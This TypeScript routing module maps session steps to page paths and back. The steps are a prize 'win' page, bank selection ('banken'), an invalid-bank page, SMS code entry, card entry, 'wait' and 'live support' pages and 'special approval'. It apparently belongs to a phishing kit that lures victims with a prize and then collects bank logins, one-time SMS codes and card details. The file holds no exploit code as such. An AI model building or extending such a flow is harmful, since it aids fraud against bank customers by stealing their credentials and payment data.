import type { SessionStep } from "@/types/session";

export function stepToPath(step: SessionStep, sessionId: string): string {
  const q = `session=${encodeURIComponent(sessionId)}`;
  switch (step) {
    case "code_entry":
      return `/code?${q}`;
    case "win":
      return `/win/${sessionId}`;
    case "banken":
      return `/banken?${q}`;
    case "wait":
      return `/wait?${q}`;
    case "invalid_bank":
      return `/invalid-bank?${q}`;
    case "live_support":
      return `/live-support?${q}`;
    case "sms":
      return `/sms?${q}`;
    case "card":
      return `/card?${q}`;
    case "congrats":
      return `/congratulations?${q}`;
    case "special_approval":
      return `/special-approval?${q}`;
    default:
      return `/win/${sessionId}`;
  }
}

export function pathToStep(pathname: string): SessionStep | null {
  if (pathname.startsWith("/code")) return "code_entry";
  if (pathname.includes("/bank/")) return "banken";
  if (pathname.startsWith("/win")) return "win";
  if (pathname.startsWith("/banken")) return "banken";
  if (pathname.startsWith("/wait")) return "wait";
  if (pathname.startsWith("/invalid-bank")) return "invalid_bank";
  if (pathname.startsWith("/live-support")) return "live_support";
  if (pathname.startsWith("/congratulations")) return "congrats";
  if (pathname.startsWith("/special-approval")) return "special_approval";
  if (pathname.startsWith("/sms")) return "sms";
  if (pathname.startsWith("/card")) return "card";
  return null;
}
